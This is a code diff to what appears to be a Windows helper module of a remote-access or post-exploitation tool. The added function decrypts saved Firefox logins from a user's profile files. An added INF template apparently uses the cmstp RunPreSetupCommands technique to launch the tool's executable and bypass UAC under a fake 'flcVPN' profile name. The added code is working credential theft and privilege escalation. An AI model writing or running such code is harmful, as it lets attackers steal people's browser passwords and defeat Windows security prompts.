@@ -377,3 +377,35 @@ def create_process(lp_application_name, lp_command_line):
     if win32pipe.PeekNamedPipe(stdout_r, 0)[1]:
         out = win32file.ReadFile(stdout_r, 1024)
         return 1, out[1].decode(locale.getdefaultlocale()[1])
+
+
+def get_firefox_password(profile_path):
+    if os.path.isdir(profile_path):
+        for item in os.listdir(profile_path):
+            item_path = os.path.join(profile_path, item)
+            if os.path.isdir(item_path):
+                if "key4.db" in os.listdir(item_path) and "logins.json" in os.listdir(item_path):
+                    import FireFoxDecrypt
+                    db_path = os.path.join(item_path, "key4.db")
+                    logins_path = os.path.join(item_path, "logins.json")
+                    return 1, str(FireFoxDecrypt.DecryptLogins(logins_path, db_path))
+    return 0, 'Password not found'
+
+
+inf_template = r'''
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+{}
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+[Strings]
+ServiceName="flcVPN"
+ShortSvcName="flcVPN"
+'''.format(get_executable_path())
